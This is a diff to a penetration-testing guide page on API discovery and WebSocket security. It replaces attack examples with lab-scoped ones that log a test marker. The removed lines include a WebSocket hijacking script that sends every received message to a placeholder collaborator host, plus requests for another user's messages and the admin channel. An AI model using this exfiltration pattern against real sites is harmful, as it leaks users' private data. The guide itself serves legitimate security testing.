@@ -11,22 +11,34 @@ tags:
 
 # APIs, GraphQL, WebSockets & File Uploads
 
+!!! note "What this page is doing"
+    API testing is inventory plus authorization: learn the schema and versions, then ask whether each object, field, mutation, upload and message is protected for the caller and tenant. Prefer a canary record over broad data extraction.
+
 ---
 
 ## 1. REST API Testing Methodology
 
 === " Discovery & Documentation Mining"
 
+    ```text
+    # Documentation and schema paths to check manually, one request at a time.
+    /swagger-ui.html       /swagger/v1/swagger.json  /v2/api-docs
+    /v3/api-docs           /api-docs                 /openapi.json
+    /redoc                 /graphql                  /graphiql
+    /playground            /api/v1/                  /api/v2/
+    /rest/                 /internal/                /.well-known/openid-configuration
+
+    # If v2 exists, compare the same object and authorization in v1, v3,
+    # beta, internal, legacy, mobile and staging versions where in scope.
+    ```
+
     ```bash
-    # Common API docs & schema locations
-    /swagger-ui.html /swagger/v1/swagger.json /v2/api-docs /v3/api-docs
-    /api-docs /openapi.json /redoc /graphql /graphiql /playground
-    /api/v1/ /api/v2/ /rest/ /internal/ /.well-known/openid-configuration
-    # Second-version shadow APIs (the #1 source of broken authz)
-    # If you see /api/v2/users — also test v1, v3, v0, beta, internal, legacy, mobile, staging
-    # Mobile-only endpoints — pull the APK/IPA and grep for API paths
-    apktool d app.apk && grep -rEi 'https?://[a-z0-9._/-]+' app/ | sort -u
-    # Extract endpoints from JS bundles & source maps (see Recon section)
+    # Pull API paths from an approved mobile lab artifact.
+    apktool d app.apk -o app_decoded
+    grep -RInE 'https?://[a-z0-9._/-]+' app_decoded \
+      | sort -u
+
+    # Extract routes from JavaScript bundles collected during recon.
     xnLinkFinder -i js_urls.txt -sf <DOMAIN> -o api_endpoints.txt
     ```
 
@@ -103,23 +115,24 @@ tags:
 ## 3. WebSocket Security
 
 ```javascript
-// 1. Unsafe Cross-Site WebSocket Hijacking (CSWSH) — NO Origin check on handshake
-// If the WS relies only on cookies for auth and does not validate Origin,
-// any site can connect using the victim's cookies:
-
+// Run from a controlled lab page with a test account. Record a marker only;
+// do not forward messages, cookies or private data to an external collector.
 const ws = new WebSocket('wss://<DOMAIN>/ws');
-ws.onopen = () => ws.send(JSON.stringify({action: 'getProfile'}));
-ws.onmessage = (e) => fetch('https://<COLLABORATOR_DOMAIN>/leak?d=' + encodeURIComponent(e.data));
 
-// 2. Message-level authz: does the server enforce auth per-message or only at handshake?
-// Try sending other users' IDs after connecting legitimately.
-ws.send(JSON.stringify({action:'getMessages', userId: <VICTIM_ID>}));
-ws.send(JSON.stringify({action:'subscribe', channel:'admin'}));
+ws.addEventListener('open', () => {
+  ws.send(JSON.stringify({ action: 'getProfile', marker: '<TEST_MARKER>' }));
+});
 
-// 3. Injection in WS messages: the message payload may hit SQLi, NoSQLi, SSTI,
-// command injection, or be rendered as HTML in the chat UI (stored XSS).
-// 4. Handshake header injection via Sec-WebSocket-Protocol / subprotocol abuse.
-// 5. Rate limiting: WS often has NO rate limit -> brute force via WS instead of HTTP.
+ws.addEventListener('message', (event) => {
+  console.log('[approved test response]', event.data);
+});
+
+// After the handshake, test message-level authorization with a test object.
+ws.send(JSON.stringify({
+  action: 'getMessages',
+  userId: '<SECOND_TEST_USER_ID>',
+  marker: '<TEST_MARKER>'
+}));
 ```
 
 ---
